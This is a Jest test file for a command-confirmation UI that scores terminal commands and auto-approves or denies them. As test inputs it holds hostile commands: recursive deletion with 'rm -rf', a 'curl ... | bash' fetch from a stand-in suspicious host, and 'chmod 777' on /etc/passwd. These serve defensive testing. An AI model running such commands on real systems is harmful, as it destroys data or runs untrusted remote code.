import { ConfirmationUI, ConfirmationResult } from '../../src/ui/ConfirmationUI';
import { CommandCategorizer } from '../../src/command/CommandCategorizer';
import { SecurityValidator } from '../../src/security/SecurityValidator';

describe('ConfirmationUI', () => {
  let confirmationUI: ConfirmationUI;
  let categorizer: CommandCategorizer;
  let validator: SecurityValidator;

  beforeEach(() => {
    confirmationUI = new ConfirmationUI();
    categorizer = new CommandCategorizer();
    validator = new SecurityValidator();
  });

  describe('User Confirmation Workflow', () => {
    test('should handle confirmation requests with proper structure', async () => {
      const command = 'git';
      const args = ['push', 'origin', 'main'];
      const analysis = categorizer.analyzeCommand(command, args);
      const securityResult = validator.validateCommand(command, args, analysis);

      const result = await confirmationUI.requestConfirmation(
        command, args, analysis, securityResult
      );

      expect(result).toHaveProperty('confirmed');
      expect(result).toHaveProperty('timestamp');
      expect(result).toHaveProperty('userResponse');
      expect(['approved', 'denied', 'timeout', 'skip']).toContain(result.userResponse);
      expect(result.timestamp).toBeInstanceOf(Date);
    });

    test('should auto-approve high security score commands', async () => {
      const command = 'echo';
      const args = ['hello world'];
      const analysis = categorizer.analyzeCommand(command, args);
      const securityResult = validator.validateCommand(command, args, analysis);

      // High security score should result in auto-approval
      expect(securityResult.score).toBeGreaterThan(90);

      const result = await confirmationUI.requestConfirmation(
        command, args, analysis, securityResult
      );

      expect(result.confirmed).toBe(true);
      expect(result.userResponse).toBe('approved');
    });

    test('should auto-deny low security score commands', async () => {
      const command = 'rm';
      const args = ['-rf', '/etc/test'];
      const analysis = categorizer.analyzeCommand(command, args);
      const securityResult = validator.validateCommand(command, args, analysis);

      // Low security score should result in auto-denial
      expect(securityResult.score).toBeLessThan(50);

      const result = await confirmationUI.requestConfirmation(
        command, args, analysis, securityResult
      );

      expect(result.confirmed).toBe(false);
      expect(result.userResponse).toBe('denied');
    });

    test('should handle timeout scenarios', async () => {
      const command = 'git';
      const args = ['clone', 'https://github.com/example/repo.git'];
      const analysis = categorizer.analyzeCommand(command, args);
      const securityResult = validator.validateCommand(command, args, analysis);

      // Set a very short timeout
      const result = await confirmationUI.requestConfirmation(
        command, args, analysis, securityResult, { timeout: 1 }
      );

      expect(result.confirmed).toBe(false);
      expect(result.userResponse).toBe('timeout');
    });

    test('should show detailed information when requested', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation(() => {});

      const command = 'sudo';
      const args = ['systemctl', 'restart', 'nginx'];
      const analysis = categorizer.analyzeCommand(command, args);
      const securityResult = validator.validateCommand(command, args, analysis);

      await confirmationUI.requestConfirmation(
        command, args, analysis, securityResult, { showDetails: true }
      );

      expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('Analysis Details'));
      expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('Security Checks'));

      consoleSpy.mockRestore();
    });
  });

  describe('Confirmation History Tracking', () => {
    test('should maintain confirmation history', async () => {
      const commands = [
        ['echo', ['test1']],
        ['ls', ['-la']],
        ['git', ['status']]
      ];

      for (const [command, args] of commands) {
        const analysis = categorizer.analyzeCommand(command, args);
        const securityResult = validator.validateCommand(command, args, analysis);
        
        await confirmationUI.requestConfirmation(command, args, analysis, securityResult);
      }

      const history = confirmationUI.getConfirmationHistory();
      expect(history.length).toBe(3);
      
      history.forEach((entry, index) => {
        expect(entry.command).toBe(`${commands[index][0]} ${commands[index][1].join(' ')}`);
        expect(entry.result).toHaveProperty('confirmed');
        expect(entry.result).toHaveProperty('timestamp');
      });
    });

    test('should provide accurate confirmation statistics', async () => {
      // Execute commands with predictable outcomes
      const highSecurityCommands = [
        ['echo', ['safe1']],
        ['ls', ['-la']],
        ['pwd', []]
      ];

      const lowSecurityCommands = [
        ['rm', ['-rf', '/dangerous']]
      ];

      // Process high-security commands (should be approved)
      for (const [command, args] of highSecurityCommands) {
        const analysis = categorizer.analyzeCommand(command, args);
        const securityResult = validator.validateCommand(command, args, analysis);
        await confirmationUI.requestConfirmation(command, args, analysis, securityResult);
      }

      // Process low-security commands (should be denied)
      for (const [command, args] of lowSecurityCommands) {
        const analysis = categorizer.analyzeCommand(command, args);
        const securityResult = validator.validateCommand(command, args, analysis);
        await confirmationUI.requestConfirmation(command, args, analysis, securityResult);
      }

      const stats = confirmationUI.getConfirmationStats();
      
      expect(stats.total).toBe(4);
      expect(stats.approved).toBe(3);
      expect(stats.denied).toBe(1);
      expect(stats.timeout).toBe(0);
      expect(stats.approvalRate).toBe(75);
    });

    test('should handle empty confirmation history gracefully', () => {
      const stats = confirmationUI.getConfirmationStats();
      
      expect(stats.total).toBe(0);
      expect(stats.approved).toBe(0);
      expect(stats.denied).toBe(0);
      expect(stats.timeout).toBe(0);
      expect(stats.approvalRate).toBe(0);
    });
  });

  describe('User Experience and Usability', () => {
    test('should provide clear command information display', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation(() => {});

      const command = 'docker';
      const args = ['run', '-p', '3000:3000', 'node:18'];
      const analysis = categorizer.analyzeCommand(command, args);
      const securityResult = validator.validateCommand(command, args, analysis);

      await confirmationUI.requestConfirmation(command, args, analysis, securityResult);

      const logCalls = consoleSpy.mock.calls.map(call => call[0]);
      
      expect(logCalls.some(call => call.includes('Terminal Command Execution Request'))).toBe(true);
      expect(logCalls.some(call => call.includes(`Command: ${command} ${args.join(' ')}`))).toBe(true);
      expect(logCalls.some(call => call.includes(`Category: ${analysis.category.name}`))).toBe(true);
      expect(logCalls.some(call => call.includes(`Risk Level: ${analysis.category.riskLevel.toUpperCase()}`))).toBe(true);
      expect(logCalls.some(call => call.includes(`Security Score: ${securityResult.score}/100`))).toBe(true);

      consoleSpy.mockRestore();
    });

    test('should show security recommendations for risky commands', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation(() => {});

      const command = 'curl';
      const args = ['http://suspicious-site.com/script.sh', '|', 'bash'];
      const analysis = categorizer.analyzeCommand(command, args);
      const securityResult = validator.validateCommand(command, args, analysis);

      await confirmationUI.requestConfirmation(
        command, args, analysis, securityResult, { showDetails: true }
      );

      const logCalls = consoleSpy.mock.calls.map(call => call[0]);
      
      if (securityResult.recommendations.length > 0) {
        expect(logCalls.some(call => call.includes('Security Recommendations'))).toBe(true);
      }

      consoleSpy.mockRestore();
    });

    test('should handle malformed or edge case commands gracefully', async () => {
      const edgeCases = [
        ['', []],
        ['command-with-unicode-🚀', ['arg']],
        ['cmd', ['arg with\nneeds\ttabs']],
        ['very-long-command-name-that-exceeds-normal-length', ['arg']]
      ];

      for (const [command, args] of edgeCases) {
        if (command === '') continue; // Skip empty command test

        const analysis = categorizer.analyzeCommand(command, args);
        const securityResult = validator.validateCommand(command, args, analysis);

        // Should not throw an error
        await expect(
          confirmationUI.requestConfirmation(command, args, analysis, securityResult)
        ).resolves.toBeDefined();
      }
    });
  });

  describe('Integration with Security Analysis', () => {
    test('should adapt confirmation behavior based on security results', async () => {
      const testCases = [
        {
          command: 'echo',
          args: ['safe command'],
          expectedConfirmed: true, // High security score
        },
        {
          command: 'rm',
          args: ['-rf', '/system'],
          expectedConfirmed: false, // Low security score
        }
      ];

      for (const { command, args, expectedConfirmed } of testCases) {
        const analysis = categorizer.analyzeCommand(command, args);
        const securityResult = validator.validateCommand(command, args, analysis);

        const result = await confirmationUI.requestConfirmation(
          command, args, analysis, securityResult
        );

        expect(result.confirmed).toBe(expectedConfirmed);
      }
    });

    test('should display relevant security check information', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation(() => {});

      const command = 'sudo';
      const args = ['chmod', '777', '/etc/passwd'];
      const analysis = categorizer.analyzeCommand(command, args);
      const securityResult = validator.validateCommand(command, args, analysis);

      await confirmationUI.requestConfirmation(
        command, args, analysis, securityResult, { showDetails: true }
      );

      const logCalls = consoleSpy.mock.calls.map(call => call[0]);
      
      // Should show security checks
      expect(logCalls.some(call => call.includes('Security Checks'))).toBe(true);
      
      // Should show individual check results
      securityResult.checks.forEach(check => {
        const checkDisplayed = logCalls.some(call => call.includes(check.name));
        expect(checkDisplayed).toBe(true);
      });

      consoleSpy.mockRestore();
    });
  });

  describe('Performance and Responsiveness', () => {
    test('should respond to confirmation requests quickly', async () => {
      const command = 'git';
      const args = ['log', '--oneline'];
      const analysis = categorizer.analyzeCommand(command, args);
      const securityResult = validator.validateCommand(command, args, analysis);

      const startTime = Date.now();
      
      await confirmationUI.requestConfirmation(command, args, analysis, securityResult);
      
      const endTime = Date.now();
      const duration = endTime - startTime;

      // Should respond within reasonable time (accounting for 1s simulation delay)
      expect(duration).toBeLessThan(2000);
    });

    test('should handle multiple concurrent confirmation requests', async () => {
      const commands = [
        ['ls', ['-la']],
        ['git', ['status']],
        ['npm', ['test']]
      ];

      const promises = commands.map(async ([command, args]) => {
        const analysis = categorizer.analyzeCommand(command, args);
        const securityResult = validator.validateCommand(command, args, analysis);
        return confirmationUI.requestConfirmation(command, args, analysis, securityResult);
      });

      const results = await Promise.all(promises);
      
      expect(results.length).toBe(3);
      results.forEach(result => {
        expect(result).toHaveProperty('confirmed');
        expect(result).toHaveProperty('userResponse');
      });
    });

    test('should maintain acceptable memory usage with large history', async () => {
      const initialMemory = process.memoryUsage().heapUsed;

      // Generate large number of confirmation requests
      for (let i = 0; i < 100; i++) {
        const command = 'echo';
        const args = [`test ${i}`];
        const analysis = categorizer.analyzeCommand(command, args);
        const securityResult = validator.validateCommand(command, args, analysis);
        
        await confirmationUI.requestConfirmation(command, args, analysis, securityResult);
      }

      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      
      // Memory increase should be reasonable (less than 10MB for 100 entries)
      expect(memoryIncrease).toBeLessThan(10 * 1024 * 1024);
      
      const history = confirmationUI.getConfirmationHistory();
      expect(history.length).toBe(100);
    });
  });
});
